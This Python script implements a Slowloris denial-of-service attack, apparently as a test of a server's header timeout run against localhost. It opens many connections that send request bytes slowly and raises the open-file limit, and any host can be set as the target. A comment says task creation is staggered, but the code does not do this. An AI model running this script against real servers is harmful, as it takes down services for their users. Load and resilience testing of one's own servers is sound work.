"""Slowloris header-phase attack.

Opens N connections, each dribbling request bytes one at a time
over `--byte-interval` seconds.  Exercises `BB_HEADER_TIMEOUT`
(default 10 s).

A correctly-defended server closes each connection after the
header-deadline elapses, freeing the slot.  The attacker reconnects
and tries again — but the loop tasks turn over at a rate the server
controls.

A vulnerable server holds the suspended-task slot for the full
duration of the attack, eventually saturating its event loop.

Usage:
    python3 slowloris_headers.py \\
        --host localhost --port 8080 \\
        --connections 4096 --byte-interval 1.0 --duration 30

Run in another shell:
    kill -USR1 $SERVER_PID    # task count snapshot
    time curl http://localhost:8080/healthz   # baseline latency check
"""
from __future__ import annotations

import argparse
import asyncio
import contextlib
import socket
import time

# A complete HTTP/1.1 request the server would answer if delivered fast.
# We send it ONE BYTE AT A TIME so the headers never complete before
# the configured BB_HEADER_TIMEOUT.
_PAYLOAD = (
    b'GET /healthz HTTP/1.1\r\n'
    b'Host: localhost\r\n'
    b'User-Agent: slowloris-headers-probe/1\r\n'
    b'Accept: */*\r\n'
    b'\r\n'
)


async def _one_connection(host: str, port: int, byte_interval: float,
                          deadline_at: float) -> None:
    """One attacker connection: dribble bytes until deadline or peer-close."""
    while time.monotonic() < deadline_at:
        try:
            reader, writer = await asyncio.open_connection(host, port)
        except OSError:
            await asyncio.sleep(0.1)
            continue
        try:
            for byte in _PAYLOAD:
                if time.monotonic() >= deadline_at:
                    break
                try:
                    writer.write(bytes([byte]))
                    await writer.drain()
                except (ConnectionResetError, BrokenPipeError, OSError):
                    break  # server closed on us; reconnect
                await asyncio.sleep(byte_interval)
        finally:
            with contextlib.suppress(Exception):
                writer.close()
                await writer.wait_closed()


async def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument('--host', default='localhost')
    parser.add_argument('--port', type=int, default=8080)
    parser.add_argument('--connections', type=int, default=1024)
    parser.add_argument('--byte-interval', type=float, default=1.0,
                        help='seconds between bytes (default 1.0 — keeps the '
                             'connection well within slowloris territory)')
    parser.add_argument('--duration', type=float, default=30.0,
                        help='total seconds to maintain the attack')
    args = parser.parse_args()

    deadline_at = time.monotonic() + args.duration

    print(f'>>> opening {args.connections} attacker connections to '
          f'{args.host}:{args.port} for {args.duration}s')
    print(f'>>> byte interval: {args.byte_interval}s')

    tasks = [
        asyncio.create_task(
            _one_connection(args.host, args.port, args.byte_interval,
                            deadline_at)
        )
        for _ in range(args.connections)
    ]
    # Stagger task creation so the kernel accept queue doesn't see
    # all SYN's at the same microsecond (we want sustained pressure,
    # not a thundering herd at t=0).
    started = time.monotonic()
    print(f'>>> attack running until t+{args.duration:.0f}s')
    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.CancelledError:
        pass
    print(f'>>> attack ended at t+{time.monotonic() - started:.1f}s')


if __name__ == '__main__':
    # Raise the open-file limit if we're allowed (each attacker
    # connection uses one FD).
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        if soft < 8192:
            resource.setrlimit(resource.RLIMIT_NOFILE, (min(hard, 8192), hard))
    except (ImportError, ValueError, OSError):
        pass
    asyncio.run(main())
